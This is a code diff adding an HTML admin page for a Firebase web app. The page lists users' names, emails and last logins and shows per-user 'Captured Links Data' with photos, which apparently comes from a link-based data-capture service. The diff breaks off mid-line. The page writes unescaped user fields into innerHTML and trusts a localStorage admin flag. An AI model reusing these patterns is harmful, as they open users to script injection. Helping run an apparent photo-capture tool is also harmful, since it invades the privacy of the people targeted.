@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Control</title>
+    <script src="https://unpkg.com/@phosphor-icons/web"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-auth-compat.js"></script>
+    <script src="config.js"></script>
+    <script>document.write(`<style>${COMMON_CSS}</style>`);</script>
+</head>
+<body>
+    <div class="app-header">
+        <div class="logo"><i class="ph-duotone ph-shield-star"></i> Admin Control</div>
+        <button onclick="window.location.href='dashboard.html'" class="btn-icon"><i class="ph-bold ph-arrow-left"></i></button>
+    </div>
+
+    <div class="scroll-area">
+        <div class="container">
+            <h3 style="margin: 10px 5px 15px 5px; font-size:1.1rem;">All Users Data</h3>
+            <div id="adminList"><div class="loader"></div></div>
+        </div>
+    </div>
+    
+    <div id="toast" class="toast"></div>
+
+<script>
+    firebase.initializeApp(firebaseConfig);
+    let allLinksData = {}; // store globally to show later
+
+    firebase.auth().onAuthStateChanged(user => {
+        if(!user || localStorage.getItem('isAdmin') !== 'true') window.location.href = 'index.html';
+        else loadAdminData();
+    });
+
+    function showToast(msg) { const t = document.getElementById('toast'); t.innerHTML = `<i class="ph-fill ph-check-circle"></i> ${msg}`; t.classList.add('show'); setTimeout(() => t.classList.remove('show'), 3000); }
+
+    async function loadAdminData() {
+        const token = await getToken();
+        const r = await fetch(`${API_BASE}/api/admin/data`, {headers:{'Authorization': `Bearer ${token}`}});
+        const d = await r.json();
+        const list = document.getElementById('adminList');
+        
+        if(!d.success) { list.innerHTML = `<div style="color:var(--danger)">Unauthorized</div>`; return; }
+        
+        allLinksData = d.all_links;
+        list.innerHTML = '';
+        
+        Object.keys(d.users).forEach(uid => {
+            const u = d.users[uid];
+            list.innerHTML += `
+            <div class="card" style="margin-bottom:15px;">
+                <div class="card-head">
+                    <span class="card-title">${u.name}</span>
+                    <span class="badge" style="background:#dcfce7; color:#166534;">Links: ${u.link_count}</span>
+                </div>
+                <div style="font-size:0.9rem; color:var(--text-sub); margin-bottom:15px;">
+                    <i class="ph-fill ph-envelope-simple"></i> ${u.email} <br>
+                    <i class="ph-fill ph-clock"></i> Last Login: ${new Date(u.last_login*1000).toLocaleString()}
+                </div>
+                <div class="actions">
+                    <button onclick="viewUserLinks('${uid}')" class="act-btn act-edit"><i class="ph-bold ph-eye"></i> View Data</button>
+                    <button onclick="deleteUser('${uid}')" class="act-btn act-del"><i class="ph-bold ph-trash"></i> Delete User</button>
+                </div>
+                <div id="links_${uid}" style="display:none; margin-top:15px; border-top:1px solid var(--border); padding-top:10px;"></div>
+            </div>`;
+        });
+    }
+
+    function viewUserLinks(uid) {
+        const container = document.getElementById(`links_${uid}`);
+        if(container.style.display === 'block') { container.style.display = 'none'; return; }
+        
+        container.style.display = 'block';
+        container.innerHTML = `<h4 style="margin-bottom:10px; font-size:0.9rem;">Captured Links Data</h4>`;
+        
+        let hasLinks = false;
+        Object.keys(allLinksData).forEach(sid => {
+            if(allLinksData[sid].uid === uid) {
+                hasLinks = true;
+                const i = allLinksData[sid]; const p = i.photos ||
